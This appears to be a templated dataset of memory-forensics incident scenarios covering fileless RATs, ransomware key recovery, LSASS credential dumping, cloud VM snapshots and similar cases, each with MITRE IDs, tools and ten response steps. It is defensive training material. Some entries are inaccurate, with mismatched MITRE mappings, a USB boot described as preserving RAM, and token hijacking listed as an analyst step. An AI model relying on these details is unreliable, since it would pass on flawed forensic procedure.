# DFIR Attacks

## Fileless RAT in RAM

- **Attack Type**: Fileless Malware
- **Target**: Workstation
- **Vulnerability**: No memory visibility
- **MITRE**: T1055
- **Impact**: Remote control by fileless malware
- **Tools**: DumpIt, Volatility
- **Scenario**: Detection of a memory-resident RAT using DumpIt and Volatility
- **Attack Steps**: 1. SOC detects unusual network traffic. 2. Disk scanning finds no malware. 3. Analyst connects to host and runs DumpIt to collect a live RAM dump. 4. RAM file transferred to forensic VM. 5. Volatility’s pslist reveals a suspicious powershell process. 6. cmdline plugin shows base64-encoded script. 7. malfind detects shellcode injection in explorer.exe. 8. Memory YARA scan matches known remote access tool (RAT). 9. Confirmed fileless malware operating only in memory. 10. Host isolated, IOCs shared for threat hunting.
- **Detection**: Volatility memory artifact analysis
- **Solution**: Deploy EDR with memory scanning
- **Tags**: Fileless, RAT, Memory

## Ransomware Key Recovery

- **Attack Type**: Ransomware
- **Target**: Endpoint
- **Vulnerability**: Ransomware delay window
- **MITRE**: T1486
- **Impact**: Encryption mitigated before completion
- **Tools**: Belkasoft RAM Capturer, Volatility
- **Scenario**: Recovering encryption keys before full ransomware execution
- **Attack Steps**: 1. Ransomware detected midway on an employee laptop. 2. Analyst performs live RAM capture using Belkasoft tool. 3. Memory image transferred to secure analysis environment. 4. Volatility used to find the ransomware process. 5. Heap inspection reveals AES key and C2 URL. 6. Analyst extracts the keys before system locks. 7. Files are decrypted successfully. 8. IOC related to ransomware extracted. 9. Host quarantined. 10. Encryption attack prevented on wider network.
- **Detection**: Volatility + Heap inspection
- **Solution**: Add live memory to ransomware IR SOP
- **Tags**: Ransomware, KeyRecovery

## Remote RAM Acquisition

- **Attack Type**: Remote Memory Capture
- **Target**: Workstation
- **Vulnerability**: Lack of remote IR capability
- **MITRE**: T1021.001
- **Impact**: Prevented attacker persistence
- **Tools**: F-Response, Volatility
- **Scenario**: Capturing memory over VPN using F-Response
- **Attack Steps**: 1. User reports suspicious activity from a remote branch. 2. Analyst connects via VPN and deploys F-Response. 3. RAM is remotely accessed and dumped securely. 4. Volatility analysis reveals malicious rundll32.exe. 5. C2 config recovered from decrypted memory. 6. In-memory webshell process is identified. 7. Browser tokens found in heap memory. 8. Credentials extracted and reset. 9. Remote host isolated. 10. Investigation expanded to neighboring systems.
- **Detection**: Remote memory dump & plugin scan
- **Solution**: Set up automated remote memory acquisition
- **Tags**: RemoteForensics, CloudIR

## Credential Theft from LSASS

- **Attack Type**: Credential Dumping
- **Target**: Server
- **Vulnerability**: LSASS unprotected
- **MITRE**: T1003
- **Impact**: Credential access by threat actor
- **Tools**: WinPMEM, Volatility
- **Scenario**: LSASS process memory reveals NTLM hashes and attacker presence
- **Attack Steps**: 1. SIEM alert on LSASS access via suspicious handle. 2. Memory is dumped live using WinPMEM. 3. Volatility run on isolated VM. 4. 'dlllist' and 'handles' reveal access to lsass.exe. 5. NTLM and plaintext credentials extracted. 6. Mimikatz remnants detected in RAM. 7. Cobalt Strike beacon memory structure observed. 8. Admin passwords reset. 9. LSASS protection enforced. 10. IOC shared and domain-wide hunt initiated.
- **Detection**: Volatility + LSASS plugins
- **Solution**: Enable Credential Guard, block LSASS dumps
- **Tags**: CredentialDump, LSASS

## Cloud VM Memory Dump

- **Attack Type**: Cloud Memory Forensics
- **Target**: Cloud VM
- **Vulnerability**: In-memory persistence
- **MITRE**: T1055.012
- **Impact**: Cryptomining in memory
- **Tools**: AWS EC2 Snapshot Tool, Rekall
- **Scenario**: Memory snapshot from AWS EC2 instance reveals attacker persistence
- **Attack Steps**: 1. Unusual outbound traffic detected from EC2. 2. Analyst triggers cloud-native memory snapshot. 3. Snapshot analyzed using Rekall tool. 4. Evidence of cryptominer running in memory. 5. RAM analysis reveals injected ELF binary. 6. Persistence mechanism via in-memory crontab spoofing. 7. API keys for lateral movement found in memory. 8. IAM roles reviewed and access revoked. 9. EC2 quarantined. 10. Security group tightened to block reentry.
- **Detection**: Snapshot + in-memory binary analysis
- **Solution**: Enable memory monitoring on cloud endpoints
- **Tags**: CloudIR, MemoryForensics

## Volatile Memory Malware Extraction

- **Attack Type**: Volatile Analysis
- **Target**: Workstation
- **Vulnerability**: Malware evades disk detection
- **MITRE**: T1055.001
- **Impact**: DLL-based attack stopped
- **Tools**: DumpIt, Volatility
- **Scenario**: Extraction of memory-resident malware DLLs with volatility
- **Attack Steps**: 1. User opens phishing link but nothing shows on disk. 2. Analyst captures memory with DumpIt. 3. RAM analyzed in lab VM. 4. ldrmodules and malfind highlight injected DLL. 5. DLL strings show C2 domain. 6. DLL dumped from RAM to disk. 7. Uploaded to sandbox for behavior analysis. 8. Sandbox confirms C2 beaconing. 9. Domain blocked across firewall. 10. Email campaign traced and shut down.
- **Detection**: Injected module detection in memory
- **Solution**: Add RAM scan to email phishing response
- **Tags**: Phishing, DLLInjection

## Memory Timeline for IR

- **Attack Type**: Timeline Reconstruction
- **Target**: Endpoint
- **Vulnerability**: No visibility into memory timelines
- **MITRE**: T1078
- **Impact**: Full reconstruction of breach
- **Tools**: Volatility, KAPE
- **Scenario**: Using memory dump to rebuild attacker timeline
- **Attack Steps**: 1. Host shows signs of past compromise. 2. Analyst dumps RAM and runs KAPE on disk. 3. Volatility’s timeliner plugin reconstructs memory timeline. 4. Correlates PowerShell and DLL injection timestamps. 5. Memory shows access to RDP and taskmgr spoofing. 6. Timeline cross-validated with KAPE MFT records. 7. Full attack window established. 8. Backdoor presence confirmed. 9. RDP access logs reviewed. 10. Timeline report submitted to legal and HR.
- **Detection**: Memory + MFT correlation
- **Solution**: Use KAPE with RAM for incident context
- **Tags**: TimelineForensics

## Memory Keylogging Detection

- **Attack Type**: Keylogger Detection
- **Target**: Laptop
- **Vulnerability**: Undetected memory-resident keylogger
- **MITRE**: T1056.001
- **Impact**: Credential theft prevented
- **Tools**: Volatility, YARA
- **Scenario**: Detecting a memory-resident keylogger
- **Attack Steps**: 1. Endpoint user reports unauthorized credential usage. 2. Analyst captures RAM and loads in Volatility. 3. YARA scan detects keylogger strings in memory. 4. psscan and cmdline reveal custom binary. 5. Heap memory analysis shows typed inputs stored. 6. C2 server IP recovered from memory. 7. Keylogger dumped and sent to sandbox. 8. Firewall rules updated. 9. User credentials reset. 10. Anti-keylogger policy enforced.
- **Detection**: YARA + heap content analysis
- **Solution**: Harden browser and input security
- **Tags**: Keylogging, MemoryThreat

## Rootkit Detection via Memory

- **Attack Type**: Rootkit
- **Target**: Endpoint
- **Vulnerability**: Kernel-mode rootkit
- **MITRE**: T1014
- **Impact**: Hidden attacker presence removed
- **Tools**: WinPMEM, Volatility
- **Scenario**: Memory dump exposes hidden processes from rootkit
- **Attack Steps**: 1. Analyst notices missing processes from task manager. 2. RAM dump acquired using WinPMEM. 3. psscan shows process not visible in task manager. 4. modscan reveals unsigned kernel module. 5. Module strings indicate known rootkit family. 6. Hidden file paths traced in memory. 7. Kernel memory dump isolated. 8. System rebooted and rootkit signature removed. 9. Host reimaged. 10. Boot protection enabled.
- **Detection**: Volatility kernel analysis
- **Solution**: Enable Secure Boot and memory protection
- **Tags**: Rootkit, KernelMemory

## Memory Analysis in USB Infection

- **Attack Type**: USB Malware
- **Target**: Workstation
- **Vulnerability**: USB autorun vulnerability
- **MITRE**: T1200
- **Impact**: Malware caught via RAM before spread
- **Tools**: FTK Imager, Volatility
- **Scenario**: Analyzing memory after USB-based malware attack
- **Attack Steps**: 1. Suspicious USB inserted by user. 2. Autorun executes unknown binary. 3. Analyst captures RAM using FTK Imager. 4. malfind and ldrmodules show injected code. 5. Memory process contains exfil domain. 6. USB serial info confirms matching VID/PID. 7. Payload dumped from memory. 8. Antivirus scan confirms malware. 9. USB blacklisted. 10. Endpoint protection policy updated.
- **Detection**: Memory + USB correlation
- **Solution**: Disable USB autorun, enforce control
- **Tags**: USB, MemoryInfection

## Capturing RAM Post Ransomware Execution

- **Attack Type**: Ransomware Response
- **Target**: Workstation
- **Vulnerability**: No live backup; memory only evidence
- **MITRE**: T1486
- **Impact**: Rapid strain identification and forensic triage
- **Tools**: WinPMEM, Volatility, yarGen
- **Scenario**: Analyst captures memory on a locked screen system post-encryption to identify the strain and potential lateral movement evidence.
- **Attack Steps**: 1. User reports locked screen with ransom note. 2. System is physically secured and power retained. 3. Analyst boots using forensics USB and launches WinPMEM. 4. Full RAM image captured and stored on external disk. 5. Volatility is used to list processes (pslist, pstree). 6. Suspicious process found injecting code into explorer.exe. 7. ‘malfind’ plugin identifies injected payload. 8. yarGen scans memory and flags known ransomware signatures. 9. IOC artifacts (ransomware config, wallet address) extracted. 10. Memory timeline shows recent lateral connections, aiding further response.
- **Detection**: Process and injection scanning in RAM
- **Solution**: Use memory-first triage post-encryption
- **Tags**: ransomware, memory capture

## Live RAM Acquisition for Insider Threat

- **Attack Type**: Insider Threat
- **Target**: Workstation
- **Vulnerability**: Insider threat often lacks malware IOCs
- **MITRE**: T1567
- **Impact**: Early detection of data exfiltration tools
- **Tools**: DumpIt, Volatility, FTK Imager
- **Scenario**: A suspected insider is accessing confidential documents; memory analysis reveals unauthorized data exfiltration tools.
- **Attack Steps**: 1. User under suspicion is monitored. 2. Security team freezes system with minimal disruption. 3. RAM dump initiated using DumpIt. 4. Volatility ‘cmdline’ and ‘pslist’ reveal tools like exfil.exe. 5. Memory string search reveals company file names in logs. 6. Shellbags plugin indicates opened confidential folders. 7. Network connections in RAM show unauthorized FTP sessions. 8. Analyst verifies file buffer remnants from RAM cache. 9. Timeline plugin aligns exfil attempts with login pattern. 10. Evidence handed to HR/legal for internal action.
- **Detection**: cmdline tracing, shellbag plugin
- **Solution**: Internal threat playbooks & policy
- **Tags**: insider threat, memory

## Memory Dump in Cloud Sandbox

- **Attack Type**: Malware Analysis
- **Target**: Virtual Machine
- **Vulnerability**: Evades disk-based AV, only visible in RAM
- **MITRE**: T1055
- **Impact**: Full behavioral analysis of memory-resident malware
- **Tools**: Cuckoo Sandbox, Volatility, VM tools
- **Scenario**: Malware detonated in cloud sandbox; memory snapshot taken to extract unpacked payload.
- **Attack Steps**: 1. Malware file submitted to Cuckoo Sandbox. 2. Sample detonated in controlled cloud VM. 3. Before VM resets, memory snapshot triggered via API. 4. Snapshot exported to local analysis machine. 5. Volatility runs malfind to catch injection points. 6. Unpacked PE header reconstructed from memory. 7. Analyst finds XOR key in decrypted config section. 8. API traffic captured from memory buffers. 9. Dropped files referenced in memory mapped regions. 10. IOC and TTPs shared with threat intel.
- **Detection**: Snapshot + unpacked code from RAM
- **Solution**: Use memory-first sandboxing
- **Tags**: sandbox, unpacking, malware

## Identifying Credential Harvester in Memory

- **Attack Type**: Credential Theft
- **Target**: Workstation
- **Vulnerability**: Credential scraping malware avoids disk
- **MITRE**: T1003
- **Impact**: Prevented credential theft escalation
- **Tools**: Belkasoft RAM Capturer, Volatility, RegRipper
- **Scenario**: Malware designed to scrape credentials is caught in memory using volatility plugins and regex sweeps.
- **Attack Steps**: 1. Suspicious outbound traffic detected. 2. System isolated, RAM acquired via Belkasoft. 3. Volatility lsadump used to extract hashes. 4. Regex-based memory search detects Gmail, Outlook patterns. 5. Clipboard contents recovered show copied passwords. 6. Process dump of keylogger reveals email alerts setup. 7. Registry hives from RAM parsed using RegRipper. 8. Logon sessions linked with anomalous access. 9. Tokens and plaintext creds scraped from memory. 10. Password reset initiated for affected accounts.
- **Detection**: Volatility + regex sweeps in RAM
- **Solution**: EDR should hook clipboard and token access
- **Tags**: credential theft, memory, regex

## RAM Dump During Active Exploitation

- **Attack Type**: Exploitation
- **Target**: Server
- **Vulnerability**: Real-time attack visibility via memory
- **MITRE**: T1059
- **Impact**: Web shell traced live during exploit
- **Tools**: WinPMEM, Volatility, Wireshark
- **Scenario**: SOC captures RAM from server while it's being exploited through web shell; live artifacts provide attacker IP, tools.
- **Attack Steps**: 1. Web server flags unusual POST traffic. 2. Live SSH connection suspected. 3. RAM dump initiated via WinPMEM while attacker still connected. 4. Volatility confirms presence of web shell in memory. 5. Shell loaded using python -c command (found in cmdline). 6. Network memory shows live TCP session to offshore IP. 7. Attacker’s file list seen in command history. 8. Memory logs list internal recon commands (netstat, whoami). 9. Attacker's tools like mimikatz.exe seen injected. 10. Immediate firewall rules added to isolate C2.
- **Detection**: RAM + net buffer correlation
- **Solution**: Web server memory logging
- **Tags**: webshell, exploitation, live forensics

## Memory Forensics on IoT Device

- **Attack Type**: IoT Malware
- **Target**: IoT Device
- **Vulnerability**: No EDR; memory-only threat visibility
- **MITRE**: T1047
- **Impact**: IoT botnet activity discovered
- **Tools**: JTAG interface, Binwalk, Volatility
- **Scenario**: IoT security camera suspected of participating in botnet; memory extracted using JTAG and analyzed.
- **Attack Steps**: 1. IoT device shows abnormal outbound traffic. 2. No local logging available. 3. Technician extracts RAM dump using JTAG interface. 4. Dump converted to usable format via Binwalk. 5. Memory carved using strings, entropy analysis. 6. Malware binary identified as Mirai variant. 7. Hardcoded IPs found in memory config. 8. Runtime commands show wget and auto-reboot loop. 9. Volatility used with custom profile to parse. 10. Vendor notified for firmware patch.
- **Detection**: JTAG + entropy and config dump
- **Solution**: Lockdown firmware & network
- **Tags**: IoT, JTAG, Mirai

## Volatility on Mac Memory for RAT

- **Attack Type**: Remote Access Trojan
- **Target**: MacBook
- **Vulnerability**: Limited Mac EDR coverage
- **MITRE**: T1027
- **Impact**: Mac RAT persistence found
- **Tools**: osxpmem, Volatility (mac_vol.py), strings
- **Scenario**: Analyst investigates persistent Mac RAT by dumping and parsing memory with mac_vol.py plugins.
- **Attack Steps**: 1. Mac endpoint behaves sluggishly. 2. RAM dumped using osxpmem. 3. Analyst uses mac_vol.py plugin set. 4. ‘pslist’ reveals unrecognized process. 5. Memory strings show C2 domain and base64 payload. 6. Mach-O binary recovered from memory mapped file. 7. Keychain contents accessed via parsed heap. 8. Launch agent reference shows persistence. 9. bash history in memory matches remote scripts. 10. RAT attribution confirmed.
- **Detection**: Mac volatility modules
- **Solution**: Add Mac memory SOP + telemetry
- **Tags**: Mac, RAT, osxpmem

## Memory Dump for Volatile Browser Artifacts

- **Attack Type**: Browser Exploit Forensics
- **Target**: Workstation
- **Vulnerability**: Web session hijacking; no disk trace
- **MITRE**: T1539
- **Impact**: Account takeover blocked
- **Tools**: DumpIt, Volatility, ChromeParse, NirSoft
- **Scenario**: Live memory used to extract autofill data, session tokens, and browser encryption keys post phishing attempt.
- **Attack Steps**: 1. User reports strange web behavior. 2. RAM dumped using DumpIt. 3. Analyst focuses on browser memory regions. 4. Volatility reveals open tabs and process memory. 5. Chrome session tokens and autofill entries found. 6. Browser master key recovered from DPAPI memory. 7. Passwords extracted using NirSoft tools. 8. Session hijack in phishing domain confirmed. 9. User’s Google token used in logs. 10. Account access revoked immediately.
- **Detection**: Browser memory parsing
- **Solution**: Rotate tokens + MFA push
- **Tags**: phishing, browser, memory

## RAM Capture via PowerShell Script

- **Attack Type**: Automated Memory Collection
- **Target**: Enterprise Fleet
- **Vulnerability**: Manual triage delays response
- **MITRE**: T1055
- **Impact**: Fast triage automation achieved
- **Tools**: PowerShell, WinPMEM, Sysinternals PSExec
- **Scenario**: SOC automates memory acquisition across infected fleet using signed PowerShell scripts.
- **Attack Steps**: 1. Multiple infections reported across region. 2. SOC deploys signed PowerShell script via PSExec. 3. Script invokes WinPMEM silently on each host. 4. Dumps saved to network share. 5. Checksums generated per dump. 6. Analyst parses dumps in parallel. 7. Memory shows malware injection via DLLs. 8. Common parent process pattern identified. 9. IOC signatures updated. 10. Script added to future response playbook.
- **Detection**: PowerShell logging + hash
- **Solution**: Memory automation in playbooks
- **Tags**: automation, PowerShell, fleet

## Cloud VM Memory Acquisition via AWS API

- **Attack Type**: Cloud IR
- **Target**: Cloud Instance
- **Vulnerability**: Cryptominer in memory only
- **MITRE**: T1496
- **Impact**: Mining operation stopped early
- **Tools**: AWS SSM, EC2 API, LiME
- **Scenario**: Memory snapshot triggered via AWS SSM to catch malware in EC2 Linux instance.
- **Attack Steps**: 1. CloudWatch alerts on unusual CPU in EC2. 2. SSM agent confirms instance health. 3. Analyst triggers memory acquisition via EC2 snapshot API. 4. LiME used to acquire memory via SSH. 5. Dump downloaded for offline review. 6. Strings identify cryptominer binary. 7. Malicious bash history confirms coin mining. 8. Memory shows outbound wallet traffic. 9. Cloud firewall rules updated. 10. Billing anomaly report used to confirm impact.
- **Detection**: Snapshot + LiME + bash analysis
- **Solution**: Cloud IR automation enabled
- **Tags**: AWS, cloud IR, cryptomining

## Memory Dump Reveals Beacon Loader

- **Attack Type**: C2 Loader in Memory
- **Target**: Workstation
- **Vulnerability**: Beacon fileless loader
- **MITRE**: T1055
- **Impact**: Covert C2 channel discovered
- **Tools**: WinPMEM, Volatility, strings
- **Scenario**: Analysts dump memory to identify a memory-resident Cobalt Strike beacon loader that never touched disk
- **Attack Steps**: 1. Analyst detects strange traffic with no file indicators. 2. RAM is dumped with WinPMEM for offline analysis. 3. Volatility ‘pslist’ shows suspicious rundll32 execution. 4. ‘cmdline’ reveals suspicious base64 payload. 5. Analyst runs ‘malfind’ and detects shellcode injections. 6. Memory strings are extracted showing Cobalt Strike watermark. 7. Beacon configuration is decrypted in memory. 8. Analysts correlate with EDR memory usage alerts. 9. IOC shared. 10. Host is reimaged to prevent persistence.
- **Detection**: Memory-based IOC + beacon watermark
- **Solution**: Block beacon pattern in memory, isolate host
- **Tags**: Fileless, MemoryLoader

## Memory Snapshot of Suspicious EC2

- **Attack Type**: Cloud Memory Acquisition
- **Target**: Cloud VM
- **Vulnerability**: No memory logging on EC2
- **MITRE**: T1530
- **Impact**: Secrets leaked, attacker persistence found
- **Tools**: AWS EC2 Snapshot, Rekall, YARA
- **Scenario**: Cloud SOC captures memory snapshot from AWS EC2 showing malware in memory and decrypted secrets
- **Attack Steps**: 1. SOC receives alert from cloud workload protection. 2. AWS memory snapshot is triggered for EC2. 3. Snapshot analyzed using Rekall on a forensics VM. 4. Memory artifacts show obfuscated Python payload in RAM. 5. Analyst dumps memory section for static YARA scanning. 6. Secrets and credentials found in plaintext in process memory. 7. Threat actor IPs linked via process memory history. 8. Decrypted command-and-control domains identified. 9. AWS CloudTrail logs correlated. 10. Instance terminated and AMI quarantined.
- **Detection**: Snapshot + YARA scan
- **Solution**: Build automation to snapshot flagged VMs
- **Tags**: Cloud, EC2Memory

## Live Memory Shows Screenlogger

- **Attack Type**: Keylogger/Screen Capture
- **Target**: Employee laptop
- **Vulnerability**: No screen capture detection
- **MITRE**: T1056.001
- **Impact**: Data leak via screen capture
- **Tools**: Belkasoft RAM Capturer, Volatility, Hex Editor
- **Scenario**: A stealth screenlogger found active only in memory using manual memory parsing
- **Attack Steps**: 1. Helpdesk reports delayed input and strange behavior. 2. Analyst uses Belkasoft to capture RAM. 3. Volatility reveals unknown injected DLL in explorer.exe. 4. Analyst uses ‘ldrmodules’ to list unbacked memory regions. 5. DLL analyzed shows calls to screen capture APIs. 6. Memory segment dumped to disk. 7. Analyst opens in Hex Editor and sees bitmap header fragments. 8. OCR confirms captured screens include sensitive emails. 9. Persistence mechanism not found – confirms memory-only. 10. User profile deleted and endpoint reimaged.
- **Detection**: API calls in memory + unbacked DLL
- **Solution**: Enable screen capture blocking + memory rules
- **Tags**: Keylogger, RAMOnly

## Credential Vault Dumped via RAM

- **Attack Type**: Password Vault Exploit
- **Target**: Desktop
- **Vulnerability**: Unlocked vault in RAM
- **MITRE**: T1555
- **Impact**: Full credential leak
- **Tools**: WinPMEM, Volatility, KeePassX
- **Scenario**: Analyst recovers credentials from an unlocked vault kept in memory during user session
- **Attack Steps**: 1. Suspicious login detected from overseas IP. 2. User's system is frozen and RAM dumped. 3. Analyst loads memory image in Volatility. 4. Process tree shows KeePassX running. 5. Analyst dumps KeePassX process memory. 6. Memory reveals decrypted password entries stored temporarily. 7. Access tokens also visible. 8. Vault master password recovered due to unlock state. 9. Team revokes all exposed credentials. 10. Enforces vault auto-lock + RAM encryption policy.
- **Detection**: Process memory inspection
- **Solution**: Auto-lock idle vaults + RAM wipe
- **Tags**: PasswordVault, DFIR

## Fileless Malware Harvests Browser Tokens

- **Attack Type**: Browser Token Theft
- **Target**: Workstation
- **Vulnerability**: No token storage protection
- **MITRE**: T1539
- **Impact**: Account compromise via RAM
- **Tools**: Volatility, strings, ChromeDump
- **Scenario**: Analysts discover browser session tokens in RAM after phishing compromise
- **Attack Steps**: 1. Phishing email leads to suspicious behavior. 2. No files found on disk. 3. RAM is captured and loaded in Volatility. 4. Analyst enumerates Chrome-related processes. 5. Analyst uses ‘memdump’ on chrome.exe process. 6. Token patterns for Gmail and GitHub located via regex. 7. Access tokens copied and used for session hijack. 8. Victim logs revoked. 9. Analyst enables browser hardening policy. 10. IOC shared for phishing lure.
- **Detection**: Token string pattern match
- **Solution**: Use browser token encryption + sandboxing
- **Tags**: BrowserToken, MemoryOnly

## Ransomware Config Extracted from RAM

- **Attack Type**: Ransomware Configuration
- **Target**: Workstation
- **Vulnerability**: Early-stage ransomware in memory
- **MITRE**: T1486
- **Impact**: Ransomware stopped before damage
- **Tools**: DumpIt, Volatility, CyberChef
- **Scenario**: Ransomware config file and keys recovered from memory before encryption began
- **Attack Steps**: 1. EDR alerts early-stage ransomware loader. 2. Analyst performs immediate RAM dump with DumpIt. 3. RAM image loaded into Volatility. 4. ‘malfind’ reveals injected ransomware thread. 5. Memory segment dumped. 6. Analyst opens binary blob in CyberChef. 7. Finds embedded config: ransom note, BTC address, mutex. 8. AES key extracted pre-encryption. 9. Samples used for decryptor dev. 10. Host isolated and backups restored.
- **Detection**: Config + key from memory
- **Solution**: Build memory triggers for known mutex
- **Tags**: Ransomware, KeyExtraction

## Insider Tools Exposed in RAM

- **Attack Type**: Insider Threat Tools
- **Target**: Workstation
- **Vulnerability**: Python tools run from memory
- **MITRE**: T1027.002
- **Impact**: Insider exfil exposed via RAM
- **Tools**: WinPMEM, YARA, Volatility
- **Scenario**: DFIR uncovers custom data exfil tool running in memory, built using Python and PyInstaller
- **Attack Steps**: 1. Data exfil alert raised at DLP. 2. Disk scan yields no binaries. 3. Analyst dumps RAM with WinPMEM. 4. YARA rule for PyInstaller triggers on memory segment. 5. Analyst uses Volatility to dump and reconstruct payload. 6. Payload decompiled to show AWS upload logic. 7. Analyst links process to insider developer account. 8. RAM logs show recent exfil time. 9. Account disabled. 10. Insider terminated and logs preserved.
- **Detection**: YARA + unpacking PyInstaller blob
- **Solution**: Monitor dev accounts, use memory scanners
- **Tags**: InsiderThreat, PythonBlob

## RAM Shows Remote Desktop Injection

- **Attack Type**: RDP Hijack
- **Target**: Jump Host
- **Vulnerability**: RDP token hijack
- **MITRE**: T1021.001
- **Impact**: RDP abuse and privilege escalation
- **Tools**: Volatility, WinPMEM
- **Scenario**: Live memory reveals injected malicious code inside RDP process on compromised jump host
- **Attack Steps**: 1. Alert on unusual RDP session hours. 2. Jump host RAM dumped live. 3. Volatility used to analyze RDP process (mstsc.exe). 4. Malicious DLL injected detected using ‘malfind’. 5. DLL includes PowerShell backdoor logic. 6. Analyst confirms user impersonation via memory tokens. 7. RAM holds attacker keystroke logs. 8. IOC shared with SOC. 9. RDP logs reviewed, NLA enforced. 10. Jump host locked down.
- **Detection**: Memory token inspection + DLL trace
- **Solution**: Enforce MFA and session validation
- **Tags**: RDPInject, Hijack

## Memory Reveals SQL Dump Script

- **Attack Type**: Database Dump via Memory
- **Target**: Database Server
- **Vulnerability**: Poor DB logging + memory exposure
- **MITRE**: T1041
- **Impact**: Large-scale DB leak
- **Tools**: Volatility, strings, SQLMap
- **Scenario**: Memory capture reveals dumped SQL credentials and active exfil via in-memory script
- **Attack Steps**: 1. SOC detects large outbound DB transfer. 2. Host RAM dumped before shutdown. 3. Analyst runs Volatility ‘pslist’. 4. SQLMap-like command lines discovered in memory. 5. Analyst uses ‘cmdline’ and ‘consoles’ to confirm dumping activity. 6. SQL connection string, creds found in RAM. 7. Shell script for dump seen using curl + obfuscation. 8. Data still in transfer buffer. 9. Leak stopped and host isolated. 10. Logging improved to capture in-memory activity.
- **Detection**: Memory command string + transfer trace
- **Solution**: Improve DB visibility and traffic control
- **Tags**: SQLDump, DBMemory

## Memory-Only Recon Script Uncovered

- **Attack Type**: In-Memory Recon
- **Target**: Workstation
- **Vulnerability**: No script logging
- **MITRE**: T1087
- **Impact**: In-memory recon with zero disk trace
- **Tools**: WinPMEM, Volatility, PowerForensics
- **Scenario**: Fileless recon script detected purely in memory, with no disk or log artifacts
- **Attack Steps**: 1. Analysts investigate privilege escalation alert. 2. RAM is dumped and parsed. 3. Unknown PowerShell script found in memory. 4. Script shows recon logic: whoami, net user, domain info. 5. No matching scripts on disk or shell history. 6. PowerForensics confirms memory execution. 7. Attacker left no persistence or disk artifacts. 8. YARA rules updated to catch signature. 9. EDR memory policy enforced. 10. Host marked as compromised.
- **Detection**: Script fragment detection in RAM
- **Solution**: Use PowerShell logging and memory rules
- **Tags**: FilelessRecon, RAMOnly

## Memory Dump to Detect Beaconing Malware

- **Attack Type**: Malware Beaconing
- **Target**: Workstation
- **Vulnerability**: Fileless C2 malware in memory
- **MITRE**: T1071.001
- **Impact**: Network compromise via stealth C2
- **Tools**: WinPMEM, Volatility, Wireshark
- **Scenario**: A host was suspected of communicating with a C2 server but had no disk-based malware.
- **Attack Steps**: 1. Security team receives alerts of periodic outbound traffic from a finance department host. 2. Disk scans reveal nothing suspicious. 3. DFIR responder uses WinPMEM to collect a RAM dump from the host while it's online. 4. RAM image is loaded into Volatility and inspected for active processes using pslist. 5. An unusual svchost.exe PID is found with abnormal parentage. 6. Using netscan, connections to a known malicious IP address are detected. 7. The cmdline plugin reveals encoded PowerShell that spawns the beacon. 8. Wireshark is used to correlate the memory capture time with outbound traffic packets. 9. The beacon’s frequency and domain are confirmed. 10. Memory indicators are shared with threat intel, and host is isolated.
- **Detection**: Memory analysis + traffic correlation
- **Solution**: Memory IOC scanning and proactive RAM collection policy
- **Tags**: memory-analysis, beaconing, fileless

## Live Memory Dump Reveals DLL Injection

- **Attack Type**: Code Injection
- **Target**: Workstation
- **Vulnerability**: In-memory DLL injection
- **MITRE**: T1055
- **Impact**: Privilege escalation & evasion
- **Tools**: DumpIt, Volatility
- **Scenario**: Suspicious PowerShell behavior leads to uncovering a malicious DLL injected into another process.
- **Attack Steps**: 1. EDR detects PowerShell spawning from Word.exe. 2. Analyst rushes to the host and uses DumpIt to perform a live RAM capture. 3. RAM image is imported into Volatility. 4. malfind identifies memory regions with executable permissions in explorer.exe. 5. Analyst extracts these sections and confirms presence of an unknown DLL with suspicious exports. 6. DLL strings reveal commands tied to lateral movement. 7. handles shows the injected DLL is reading lsass.exe memory. 8. Volatility’s dlllist confirms it wasn’t loaded from disk — it’s fully in-memory. 9. IOC is created for injected signature. 10. Host is contained, and injected DLL is shared with malware analysts.
- **Detection**: Memory scan for injected artifacts
- **Solution**: Improve DLL monitoring via EDR and memory hooks
- **Tags**: dll-injection, memory-forensics, powershell

## Detecting In-Memory CoinMiner

- **Attack Type**: Crypto Mining
- **Target**: Server
- **Vulnerability**: Fileless miner in memory
- **MITRE**: T1496
- **Impact**: Resource hijacking
- **Tools**: Belkasoft RAM Capturer, Volatility
- **Scenario**: System lags due to in-memory miner — no disk artifact found.
- **Attack Steps**: 1. Helpdesk reports slow server performance, but no alerts are triggered. 2. Forensic analyst captures RAM using Belkasoft RAM Capturer. 3. In Volatility, psscan reveals a high CPU usage process not listed by standard tools. 4. cmdline shows suspicious shellcode string passed to rundll32. 5. malfind identifies shellcode using known XMRig patterns. 6. netscan identifies connections to public mining pools. 7. ldrmodules reveals manually mapped PE — not loaded normally. 8. YARA rules confirm memory-resident XMRig miner. 9. Host is isolated. 10. Company-wide sweep is launched using same YARA rule.
- **Detection**: Memory signature + network indicators
- **Solution**: Deploy miner-specific YARA and network monitoring
- **Tags**: coinminer, memory-only, fileless

## RDP Session Hijack Caught in Memory

- **Attack Type**: Credential Theft
- **Target**: Workstation
- **Vulnerability**: LSASS dump exposure
- **MITRE**: T1003.001
- **Impact**: Credential compromise
- **Tools**: WinPMEM, Volatility, Mimikatz
- **Scenario**: Attacker used in-memory credential theft to hijack an active RDP session.
- **Attack Steps**: 1. SOC notices admin account logins from unusual IP. 2. Host still online — WinPMEM is run to dump memory. 3. Volatility’s pstree shows suspicious lsass.exe access. 4. Dumped memory is parsed through Mimikatz offline. 5. Cleartext passwords and NTLM hashes are found. 6. netscan identifies open RDP session from external source. 7. svcscan reveals creation of malicious service to retain access. 8. Mapped tokens reveal privilege escalation via stolen credentials. 9. RDP session is forcibly terminated. 10. All credentials reset, GPO updated.
- **Detection**: Token and RDP memory analysis
- **Solution**: LSASS protection, token encryption, network isolation
- **Tags**: credential-theft, rdphijack, memory-analysis

## Live Memory Dump from Cloud VM (EC2)

- **Attack Type**: Cloud Memory Forensics
- **Target**: Cloud VM
- **Vulnerability**: No agent-based detection in cloud RAM
- **MITRE**: T1055.012
- **Impact**: Cloud persistence via memory-only access
- **Tools**: AWS EC2 CLI, AVML, Rekall
- **Scenario**: EC2 shows signs of compromise; memory analysis confirms in-memory backdoor.
- **Attack Steps**: 1. AWS GuardDuty flags instance for abnormal activity. 2. Cloud IR team snapshots memory using AVML from EC2. 3. Memory image copied to S3 and analyzed using Rekall. 4. Rekall detects process with mismatched parent-child relationship. 5. Memory strings show embedded SSH private keys. 6. In-memory reverse shell is found in a Python subprocess. 7. Rekall’s plugin reveals evidence of base64-decoded malware running in tmpfs. 8. IAM credentials identified in environment variables. 9. Instance terminated, and access logs audited. 10. IAM keys revoked, and new AMI built.
- **Detection**: Memory dump + plugin analysis
- **Solution**: Enforce hardened AMIs, scan memory periodically
- **Tags**: cloud-forensics, ec2, avml

## Capturing Volatile RAM Artifacts Post-Breach

